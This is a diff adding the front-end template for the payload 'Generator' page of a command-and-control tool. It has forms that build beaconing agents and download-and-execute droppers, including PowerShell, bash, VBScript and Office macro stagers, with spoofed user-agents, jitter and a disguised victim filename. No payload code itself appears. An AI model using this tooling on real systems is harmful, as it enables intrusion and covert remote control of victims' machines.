@@ -1,0 +1,346 @@
+{% extends 'base.html' %}
+{% set active_page = 'generator' %}
+{% block title %}Generator — C2//OPS{% endblock %}
+
+{% block extra_style %}
+  .gen-page   { padding: 24px; max-width: 1300px; margin: 0 auto; }
+  .page-title { font-family: var(--font-mono); font-size: 1rem; font-weight: 700; color: var(--green); margin-bottom: 4px; }
+  .page-sub   { font-size: .8rem; color: var(--muted); margin-bottom: 18px; }
+
+  /* Tab switcher */
+  .gen-tabs   { display: flex; gap: 6px; margin-bottom: 20px; }
+  .gen-tab {
+    font-family: var(--font-mono); font-size: .78rem; padding: 7px 18px;
+    border-radius: 5px; border: 1px solid var(--border); background: none;
+    color: var(--muted); cursor: pointer; transition: all .15s;
+  }
+  .gen-tab:hover { color: var(--text); background: rgba(255,255,255,.04); }
+  .gen-tab.active { color: var(--green); border-color: rgba(0,255,65,.3); background: rgba(0,255,65,.07); }
+
+  .tab-panel  { display: none; }
+  .tab-panel.active { display: grid; grid-template-columns: 340px 1fr; gap: 20px; align-items: start; }
+
+  /* Form card */
+  .form-card  { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; padding: 20px; }
+  .form-title { font-family: var(--font-mono); font-size: .78rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; margin-bottom: 18px; }
+  .field      { margin-bottom: 16px; }
+  .field label{ display: block; font-size: .75rem; font-weight: 500; color: var(--muted); margin-bottom: 6px; font-family: var(--font-mono); text-transform: uppercase; letter-spacing: .5px; }
+  .field input, .field select {
+    width: 100%; background: var(--bg); border: 1px solid var(--border); border-radius: 4px;
+    padding: 9px 12px; font-family: var(--font-mono); font-size: .8rem; color: var(--text); outline: none;
+    transition: border-color .15s;
+  }
+  .field input:focus, .field select:focus { border-color: var(--green); }
+  .field-row  { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
+  .toggle-row { display: flex; align-items: center; justify-content: space-between; margin-bottom: 16px; }
+  .toggle-label { font-family: var(--font-mono); font-size: .75rem; color: var(--muted); text-transform: uppercase; }
+  .toggle { position: relative; width: 40px; height: 22px; }
+  .toggle input { opacity: 0; width: 0; height: 0; }
+  .slider { position: absolute; inset: 0; background: var(--border); border-radius: 22px; cursor: pointer; transition: background .15s; }
+  .slider::before { content:''; position:absolute; width:16px;height:16px;left:3px;bottom:3px;background:#fff;border-radius:50%;transition:transform .15s; }
+  input:checked + .slider { background: var(--green); }
+  input:checked + .slider::before { transform: translateX(18px); }
+
+  .generate-btn { width: 100%; background: var(--green); color: #000; border: none; border-radius: 4px; padding: 11px; font-family: var(--font-mono); font-size: .85rem; font-weight: 700; cursor: pointer; margin-top: 4px; letter-spacing: .5px; transition: background .15s; }
+  .generate-btn:hover { background: var(--green-dim); }
+  .generate-btn.dropper { background: var(--cyan); }
+  .generate-btn.dropper:hover { background: #00aad4; }
+
+  .warn-box { background: rgba(255,140,0,.08); border: 1px solid rgba(255,140,0,.25); border-radius: 4px; padding: 10px 12px; font-size: .75rem; color: var(--orange); margin-top: 14px; line-height: 1.6; }
+  .info-box { background: rgba(0,212,255,.06); border: 1px solid rgba(0,212,255,.2); border-radius: 4px; padding: 10px 12px; font-size: .75rem; color: var(--cyan); margin-top: 14px; line-height: 1.6; }
+
+  /* Dropper type grid */
+  .dropper-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 8px; margin-bottom: 16px; }
+  .dtype-card {
+    background: var(--bg); border: 1px solid var(--border); border-radius: 5px;
+    padding: 8px 10px; cursor: pointer; transition: all .15s; text-align: left;
+  }
+  .dtype-card:hover { border-color: var(--cyan); }
+  .dtype-card.selected { border-color: var(--cyan); background: rgba(0,212,255,.07); }
+  .dtype-name { font-family: var(--font-mono); font-size: .72rem; color: var(--text); font-weight: 700; }
+  .dtype-os   { font-family: var(--font-mono); font-size: .62rem; color: var(--muted); margin-top: 2px; }
+
+  /* Output card */
+  .output-card { background: var(--surface); border: 1px solid var(--border); border-radius: 8px; overflow: hidden; }
+  .output-hdr  { display: flex; align-items: center; justify-content: space-between; padding: 12px 16px; border-bottom: 1px solid var(--border); }
+  .output-title{ font-family: var(--font-mono); font-size: .78rem; color: var(--muted); text-transform: uppercase; letter-spacing: 1px; }
+  .output-actions { display: flex; gap: 8px; }
+  .copy-btn, .dl-btn { font-family: var(--font-mono); font-size: .7rem; padding: 4px 10px; border-radius: 3px; cursor: pointer; border: 1px solid var(--border); background: none; color: var(--muted); transition: all .15s; }
+  .copy-btn:hover { color: var(--green); border-color: var(--green); }
+  .dl-btn:hover   { color: var(--cyan);  border-color: var(--cyan); }
+  .code-block { margin: 0; padding: 20px; font-family: var(--font-mono); font-size: .75rem; line-height: 1.7; overflow: auto; max-height: calc(100vh - 240px); color: var(--text); white-space: pre; background: var(--bg); }
+  .placeholder-msg { padding: 60px 20px; text-align: center; color: var(--muted); font-family: var(--font-mono); font-size: .82rem; }
+
+  /* Syntax highlights */
+  .kw  { color: #ff7b72; }
+  .str { color: #a5d6ff; }
+  .cmt { color: var(--muted); }
+  .num { color: #79c0ff; }
+
+  /* Dropper OS badge */
+  .dropper-meta { display: flex; gap: 8px; align-items: center; }
+  .os-badge { font-family: var(--font-mono); font-size: .65rem; padding: 2px 8px; border-radius: 3px; background: rgba(0,212,255,.1); border: 1px solid rgba(0,212,255,.2); color: var(--cyan); }
+{% endblock %}
+
+{% block content %}
+<div class="gen-page">
+  <div class="page-title">// Generator</div>
+  <div class="page-sub">Build self-contained payloads and stagers for deployment</div>
+
+  <!-- Tab switcher -->
+  <div class="gen-tabs">
+    <button class="gen-tab active" onclick="switchTab('agent', this)">⚡ Agent Generator</button>
+    <button class="gen-tab"        onclick="switchTab('dropper', this)">💉 Dropper / Stager</button>
+  </div>
+
+  <!-- ═══════════════════════════ AGENT TAB ═══════════════════════════ -->
+  <div class="tab-panel active" id="tab-agent">
+    <div class="form-card">
+      <div class="form-title">// Agent Configuration</div>
+
+      <div class="field">
+        <label>C2 Server URL</label>
+        <input id="c2_server" type="text" value="{{ default_server }}" placeholder="https://192.168.1.10:5000"/>
+      </div>
+      <div class="field">
+        <label>API Key (X-Beacon-Token)</label>
+        <input id="api_key" type="text" value="{{ default_key }}"/>
+      </div>
+      <div class="field-row">
+        <div class="field">
+          <label>Beacon Interval (s)</label>
+          <input id="beacon_interval" type="number" value="30" min="5" max="3600"/>
+        </div>
+        <div class="field">
+          <label>Jitter (±s)</label>
+          <input id="jitter" type="number" value="10" min="0" max="300"/>
+        </div>
+      </div>
+      <div class="field">
+        <label>User-Agent</label>
+        <select id="user_agent">
+          <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36">Chrome 124 / Windows</option>
+          <option value="Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36">Chrome 124 / macOS</option>
+          <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:125.0) Gecko/20100101 Firefox/125.0">Firefox 125 / Windows</option>
+          <option value="Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/124.0.0.0 Safari/537.36">Edge 124 / Windows</option>
+        </select>
+      </div>
+
+      <div class="toggle-row">
+        <span class="toggle-label">AES-256 Encryption</span>
+        <label class="toggle"><input type="checkbox" id="encrypt" checked onchange="toggleEncKey()"/><span class="slider"></span></label>
+      </div>
+      <div class="field" id="enc-key-field">
+        <label>Encryption Key (hex, 64 chars)</label>
+        <input id="encryption_key" type="text" value="{{ default_enc_key }}" style="font-size:.7rem"/>
+      </div>
+
+      <button class="generate-btn" onclick="generateAgent()">⚡ Generate Agent</button>
+      <div class="warn-box">⚠ For authorised lab use only. Never deploy against systems you do not own or have written permission to test.</div>
+    </div>
+
+    <div class="output-card">
+      <div class="output-hdr">
+        <div class="output-title" id="agent-out-title">// agent_generated.py</div>
+        <div class="output-actions">
+          <button class="copy-btn" id="agent-copy-btn" onclick="copyCode('agent')" style="display:none">copy</button>
+          <button class="dl-btn"   id="agent-dl-btn"   onclick="downloadCode('agent', 'agent_generated.py')" style="display:none">↓ download</button>
+        </div>
+      </div>
+      <div id="agent-output-area"><div class="placeholder-msg">// Configure settings and click Generate</div></div>
+    </div>
+  </div>
+
+  <!-- ═══════════════════════════ DROPPER TAB ═══════════════════════════ -->
+  <div class="tab-panel" id="tab-dropper">
+    <div class="form-card">
+      <div class="form-title">// Dropper Configuration</div>
+
+      <div class="field">
+        <label>Dropper Type</label>
+      </div>
+      <div class="dropper-grid">
+        <div class="dtype-card selected" onclick="selectDropper('powershell', this)">
+          <div class="dtype-name">PowerShell Cradle</div>
+          <div class="dtype-os">Windows</div>
+        </div>
+        <div class="dtype-card" onclick="selectDropper('powershell_oneliner', this)">
+          <div class="dtype-name">PS One-liner</div>
+          <div class="dtype-os">Windows (compact)</div>
+        </div>
+        <div class="dtype-card" onclick="selectDropper('python', this)">
+          <div class="dtype-name">Python Bootstrap</div>
+          <div class="dtype-os">Cross-platform</div>
+        </div>
+        <div class="dtype-card" onclick="selectDropper('bash', this)">
+          <div class="dtype-name">Bash Stager</div>
+          <div class="dtype-os">Linux / macOS</div>
+        </div>
+        <div class="dtype-card" onclick="selectDropper('vbscript', this)">
+          <div class="dtype-name">VBScript</div>
+          <div class="dtype-os">Windows legacy</div>
+        </div>
+        <div class="dtype-card" onclick="selectDropper('macro', this)">
+          <div class="dtype-name">VBA Macro</div>
+          <div class="dtype-os">Office (Excel/Word)</div>
+        </div>
+      </div>
+
+      <div class="field">
+        <label>Payload Host URL</label>
+        <input id="d-payload-url" type="text" placeholder="https://192.168.1.10:8080/agent.py"/>
+      </div>
+      <div class="field">
+        <label>Output Filename on Victim</label>
+        <input id="d-filename" type="text" value="update_helper.py"/>
+      </div>
+      <div class="field">
+        <label>Interpreter / Runtime</label>
+        <select id="d-interpreter">
+          <option value="python">python</option>
+          <option value="python3">python3</option>
+          <option value="pythonw">pythonw (Windows, no window)</option>
+          <option value="python.exe">python.exe</option>
+        </select>
+      </div>
+
+      <button class="generate-btn dropper" onclick="generateDropper()">💉 Generate Dropper</button>
+      <div class="info-box">
+        ℹ Host your generated agent on a web server the victim can reach.<br>
+        The dropper downloads and executes it — nothing is embedded.
+      </div>
+      <div class="warn-box">⚠ For authorised lab use only.</div>
+    </div>
+
+    <div class="output-card">
+      <div class="output-hdr">
+        <div class="dropper-meta">
+          <div class="output-title" id="dropper-out-title">// dropper output</div>
+          <span class="os-badge" id="dropper-os-badge" style="display:none"></span>
+        </div>
+        <div class="output-actions">
+          <button class="copy-btn" id="dropper-copy-btn" onclick="copyCode('dropper')" style="display:none">copy</button>
+          <button class="dl-btn"   id="dropper-dl-btn"   onclick="downloadDropper()" style="display:none">↓ download</button>
+        </div>
+      </div>
+      <div id="dropper-output-area"><div class="placeholder-msg">// Select a dropper type and click Generate</div></div>
+    </div>
+  </div>
+
+</div>
+{% endblock %}
+
+{% block extra_script %}
+let generatedAgent   = '';
+let generatedDropper = '';
+let dropperExt       = 'txt';
+let selectedDropperType = 'powershell';
+
+// ── Tab switching ─────────────────────────────────────────────────────────────
+function switchTab(name, btn) {
+  document.querySelectorAll('.tab-panel').forEach(p => p.classList.remove('active'));
+  document.querySelectorAll('.gen-tab').forEach(b => b.classList.remove('active'));
+  document.getElementById('tab-' + name).classList.add('active');
+  btn.classList.add('active');
+}
+
+// ── Dropper type selection ────────────────────────────────────────────────────
+function selectDropper(type, el) {
+  document.querySelectorAll('.dtype-card').forEach(c => c.classList.remove('selected'));
+  el.classList.add('selected');
+  selectedDropperType = type;
+}
+
+// ── Agent generator ───────────────────────────────────────────────────────────
+function toggleEncKey() {
+  document.getElementById('enc-key-field').style.display =
+    document.getElementById('encrypt').checked ? '' : 'none';
+}
+
+async function generateAgent() {
+  const btn = document.querySelector('#tab-agent .generate-btn');
+  btn.textContent = '⚡ Generating...'; btn.disabled = true;
+  try {
+    const resp = await fetch('/api/generate', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        c2_server:       document.getElementById('c2_server').value.trim(),
+        api_key:         document.getElementById('api_key').value.trim(),
+        beacon_interval: parseInt(document.getElementById('beacon_interval').value),
+        jitter:          parseInt(document.getElementById('jitter').value),
+        user_agent:      document.getElementById('user_agent').value,
+        encrypt:         document.getElementById('encrypt').checked,
+        encryption_key:  document.getElementById('encryption_key').value.trim(),
+      })
+    });
+    const data = await resp.json();
+    generatedAgent = data.code;
+    renderCode('agent-output-area', generatedAgent);
+    document.getElementById('agent-copy-btn').style.display = '';
+    document.getElementById('agent-dl-btn').style.display   = '';
+  } catch(e) { alert('Generation failed: ' + e); }
+  btn.textContent = '⚡ Generate Agent'; btn.disabled = false;
+}
+
+// ── Dropper generator ─────────────────────────────────────────────────────────
+async function generateDropper() {
+  const btn = document.querySelector('#tab-dropper .generate-btn');
+  btn.textContent = '💉 Generating...'; btn.disabled = true;
+  try {
+    const resp = await fetch('/api/dropper', {
+      method: 'POST', headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({
+        type:         selectedDropperType,
+        payload_url:  document.getElementById('d-payload-url').value.trim(),
+        filename:     document.getElementById('d-filename').value.trim(),
+        interpreter:  document.getElementById('d-interpreter').value,
+      })
+    });
+    const data = await resp.json();
+    if (data.error) { alert(data.error); return; }
+    generatedDropper = data.code;
+    dropperExt = data.ext;
+    document.getElementById('dropper-out-title').textContent = `// dropper.${data.ext}`;
+    const osBadge = document.getElementById('dropper-os-badge');
+    osBadge.textContent = data.os;
+    osBadge.style.display = '';
+    renderCode('dropper-output-area', generatedDropper);
+    document.getElementById('dropper-copy-btn').style.display = '';
+    document.getElementById('dropper-dl-btn').style.display   = '';
+  } catch(e) { alert('Generation failed: ' + e); }
+  btn.textContent = '💉 Generate Dropper'; btn.disabled = false;
+}
+
+// ── Rendering ─────────────────────────────────────────────────────────────────
+function renderCode(areaId, code) {
+  const escaped = code
+    .replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;')
+    .replace(/(#.*|'.*)/g, '<span class="cmt">$1</span>')
+    .replace(/\b(import|from|def|return|if|else|elif|while|for|try|except|in|not|and|or|True|False|None|class|with|as|global|raise|Sub|End|Dim|Set|Function)\b/g, '<span class="kw">$1</span>')
+    .replace(/("(?:[^"\\]|\\.)*"|'(?:[^'\\]|\\.)*')/g, '<span class="str">$1</span>')
+    .replace(/\b(\d+)\b/g, '<span class="num">$1</span>');
+  document.getElementById(areaId).innerHTML = `<pre class="code-block">${escaped}</pre>`;
+}
+
+function copyCode(type) {
+  const text = type === 'agent' ? generatedAgent : generatedDropper;
+  const btnId = type + '-copy-btn';
+  navigator.clipboard.writeText(text).then(() => {
+    const b = document.getElementById(btnId);
+    b.textContent = 'copied!'; setTimeout(() => b.textContent = 'copy', 1500);
+  });
+}
+
+function downloadCode(type, filename) {
+  const text = type === 'agent' ? generatedAgent : generatedDropper;
+  const blob = new Blob([text], {type:'text/plain'});
+  const url  = URL.createObjectURL(blob);
+  const a    = document.createElement('a');
+  a.href = url; a.download = filename; a.click();
+  URL.revokeObjectURL(url);
+}
+
+function downloadDropper() {
+  downloadCode('dropper', 'dropper.' + dropperExt);
+}
+{% endblock %}
